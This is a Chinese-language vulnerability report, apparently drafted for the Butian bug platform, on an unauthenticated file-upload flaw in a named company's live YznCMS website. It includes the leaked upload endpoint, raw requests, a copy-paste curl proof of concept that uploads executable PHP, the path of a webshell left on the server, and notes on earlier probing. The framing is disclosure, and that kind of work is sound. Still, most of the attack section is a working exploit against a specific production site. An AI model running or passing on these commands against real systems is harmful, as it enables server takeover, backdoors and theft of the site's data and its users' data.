# biobasebaby.com 未授权任意文件上传 → RCE（高危）

**发现时间**: 2026-07-11  
**目标**: https://www.biobasebaby.com  
**厂商**: 山东博科保育科技股份有限公司  
**CMS**: YznCMS v1.0.0 (ThinkPHP)  
**等级**: **高危**（未授权上传 + PHP 代码执行）

---

## 漏洞概述

前台留言模块配置页泄露上传接口地址，该接口**无需登录**即可上传任意文件（含 `.php`），上传后可直接 Web 访问并执行 PHP 代码，导致**远程代码执行（RCE）**。

---

## 漏洞链路

1. 访问留言配置页获取上传 URL：
   ```
   GET /index.php/formguide/index/index.html?id=5
   ```
   响应 JS 变量 `GV.image_upload_url` 泄露：
   ```
   /index.php/attachment/upload/upload/dir/images/module/formguide.html
   ```

2. 未授权 POST 上传 PHP 文件：
   ```
   POST /index.php/attachment/upload/upload/dir/images/module/formguide.html
   Content-Type: multipart/form-data
   
   file=@shell.php (内容为 <?php phpinfo(); ?>)
   ```

3. 响应返回 webshell 路径：
   ```json
   {"code":0,"success":1,"url":"/uploads/images/20260711/28780d18d636d7dd247905bc187a7ffd.php","state":"SUCCESS"}
   ```

4. 直接访问 webshell 执行 PHP：
   ```
   GET /uploads/images/20260711/28780d18d636d7dd247905bc187a7ffd.php
   ```
   返回完整 `phpinfo()` 页面，PHP 7.4.33。

---

## PoC（curl）

```bash
# 1. 上传
curl -sk -X POST 'https://www.biobasebaby.com/index.php/attachment/upload/upload/dir/images/module/formguide.html' \
  -F 'file=@shell.php;type=application/octet-stream'

# shell.php 内容: <?php phpinfo(); ?>

# 2. 访问返回的 url 字段即可执行
curl -sk 'https://www.biobasebaby.com/uploads/images/20260711/28780d18d636d7dd247905bc187a7ffd.php' | head
```

---

## 验证结果

| 测试项 | 结果 |
|--------|------|
| 未授权上传 `.php` | ✅ 成功 |
| 未授权上传 `.phtml/.php5` | ✅ 成功 |
| Web 访问执行 PHP | ✅ phpinfo() 完整输出 |
| 系统信息泄露 | ✅ `php_uname()` 可执行 |
| 需登录/Token | ❌ 不需要 |

---

## 危害

- **远程代码执行**：可执行任意 PHP 代码
- **服务器接管**：可读写文件、连接内网、植入后门
- **数据泄露**：可读取数据库配置、网站源码、用户数据
- **供应链风险**：同 IP 多域名共用（biobase.cn 等 Host 头均指向同站）

---

## 与历史测试的差异

此前测试 `api.php?s=attachment/upload/upload` 返回 `{"code":-1}`，**失败原因是路径不对**。  
正确路径需带 `.html` 后缀且从 formguide 模块配置泄露：
`/index.php/attachment/upload/upload/dir/images/module/formguide.html`

---

## 补天提交建议

| 字段 | 内容 |
|------|------|
| 漏洞类型 | 文件上传 / 代码执行 |
| 危害等级 | **高危** |
| 利用条件 | 无需认证 |
| 证明 | phpinfo 截图 + 上传响应 JSON |

---

## 证据文件

- `upload_exploit.txt` — 批量上传测试
- `rce_verify.txt` — phpinfo 执行验证
- `rce_cmd_verify.txt` — 系统信息验证
- `formguide_deep.txt` — 上传 URL 泄露来源
